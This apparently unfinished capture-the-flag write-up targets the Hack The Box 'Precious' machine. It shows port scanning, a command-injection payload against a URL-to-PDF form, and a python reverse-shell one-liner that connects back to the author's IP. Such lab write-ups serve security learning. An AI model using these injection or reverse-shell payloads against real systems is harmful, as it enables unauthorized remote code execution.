# Precious [In Progress]

## Service and Port Enumeration

Let's start with a basic port scan (no ping)
`nmap -sS -Pn 10.10.11.189`

Nmap gives us:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Run NSE scripts to find domain name?
```
└─$ sudo nmap -sV -sC -Pn 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-08 22:49 EST
Nmap scan report for 10.10.11.189
Host is up (0.0055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The IP resolves to `http://precious.htb/`

We add this to our `/etc/hosts` file, and plug the hostname into the browser

---

## The webpage

The main functionality of the page is to submit data entered into a text field - sent as an HTTP POST request

Intercepting the request, we see:
```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Origin: http://precious.htb
DNT: 1
Connection: keep-alive
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1

url=
```

So, we supply a url and it will print a pdf with its contents
- This seems like an injection type of vuln
- I could have it, for instance, print the contents of my current directory
    - All i'd need to do is set up a network listener

So let's prop up a python web server: `python3 -m http.server 80`
```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then we inject our IP address into the text field
```
http://10.10.14.37
```

We get a PDF in a new tab with the contents of our directory!
- So, we can connect to our url, and add a `name` query string 
    - We can delimit a user input `fragment` with `#`
    - We can encapsulate a user input `fragment` with `{<user_input>}`
    - We surround our 'payload' string with `''`'s, and the command itself with tick-marks 
    - Full info on query string syntax is documented in [RFC3986](https://www.rfc-editor.org/rfc/rfc3986)

### Demonstration:

When we try
```
'http://10.10.14.37/?name=#{`echo hello`}'
```

We get the following:
```
Directory listing for /?name=#{`echo hello`}
```

This is not the output we were hoping for, let's wrap it in single quotes

When we try '`echo hello`', we get a URL-encoded string:
```
10.10.11.189 - - [17/Dec/2022 11:57:35] "GET /?name=%23%7B'%60echo%20hello%60'%7D HTTP/1.1" 200 -
```
And
```
Directory listing for /?name=#{'`echo hello`'}
```

Also not what we were looking for!
- If we purposely inject a url-encoded character (like a space - `%20`)
    - Will that trick the parser into running the input?

Running
```
"http://10.10.14.37/?name=#{'%20`echo hello`'}"
```

We get:
```
10.10.11.189 - - [17/Dec/2022 12:29:01] "GET /?name= HTTP/1.1" 200 -
```
And
```
Directory listing for /?name=
```

So the instruction looks as though it were processed, but we don't know for sure

Let's try a command that we can more easily verify:
``` 
http://10.10.14.37/?name=#{'%20`sleep 5`'}
```

We see the browser sleep for 5 seconds and then post the HTTP response
- So we know that our commands in this format are working 
- Let's try to get a reverse shell

When running this as input:
```
http://10.10.14.37/?name=#{'%20`python3 -c 'import pty,socket;s=socket.socket();s.connect(("10.10.14.37", 80));pty.spawn("/bin/bash")'`'}
```

Our session hangs - which is also a good sign! But we're not seeing a shell spawn:
```
10.10.11.189 - - [17/Dec/2022 13:48:30] "GET /?name= HTTP/1.1" 200 -
```


